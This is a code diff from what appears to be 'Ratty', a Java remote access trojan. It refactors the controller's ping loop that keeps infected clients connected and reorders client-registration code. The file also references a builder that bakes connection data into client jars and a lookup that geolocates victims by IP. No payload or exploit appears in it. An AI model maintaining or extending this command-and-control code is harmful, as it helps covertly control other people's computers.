@@ -14,10 +14,7 @@ import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
-import de.sogomn.engine.Clock;
 import de.sogomn.engine.fx.Sound;
-import de.sogomn.engine.util.Scheduler;
-import de.sogomn.engine.util.Scheduler.Task;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
 import de.sogomn.rat.gui.ChatWindow;
@@ -60,10 +57,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private IRattyGui gui;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
-	
-	private Clock clock;
-	private Scheduler scheduler;
-	private Task pingTask;
 	
 	private static final String BUILDER_REPLACEMENT = "connection_data";
 	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
@@ -111,7 +104,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String FILE_BYTES = LANGUAGE.getString("file_information.bytes");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
-	private static final float PING_INTERVAL = 3;
+	private static final long PING_INTERVAL = 3000;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -119,28 +112,24 @@ public final class RattyGuiController extends AbstractRattyController implements
 		this.server = server;
 		this.gui = gui;
 		
-		final Runnable task = () -> {
-			final PingPacket packet = new PingPacket();
-			
-			connections.forEach(connection -> connection.addPacket(packet));
-			pingTask.reset();
-		};
 		final Thread pingThread = new Thread(() -> {
 			while (true) {
-				clock.update();
+				final PingPacket packet = new PingPacket();
+				
+				broadcast(packet);
+				
+				try {
+					Thread.sleep(PING_INTERVAL);
+				} catch (final Exception ex) {
+					ex.printStackTrace();
+				}
 			}
 		});
 		
 		clients = new HashMap<ActiveConnection, ServerClient>();
-		clock = new Clock();
-		scheduler = new Scheduler();
-		pingTask = new Task(task, PING_INTERVAL);
 		
 		pingThread.setDaemon(true);
 		pingThread.start();
-		
-		scheduler.addTask(pingTask);
-		clock.addListener(scheduler);
 	}
 	
 	/*
@@ -696,18 +685,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	@Override
 	public void connected(final ActiveServer server, final ActiveConnection connection) {
-		final ServerClient client = new ServerClient(connection);
-		
 		super.connected(server, connection);
+		
+		final ServerClient client = new ServerClient(connection);
 		
 		clients.put(connection, client);
 	}
 	
 	@Override
 	public void disconnected(final ActiveConnection connection) {
-		final ServerClient client = getClient(connection);
-		
 		super.disconnected(connection);
+		
+		final ServerClient client = getClient(connection);
 		
 		gui.removeClient(client);
 		clients.remove(connection);
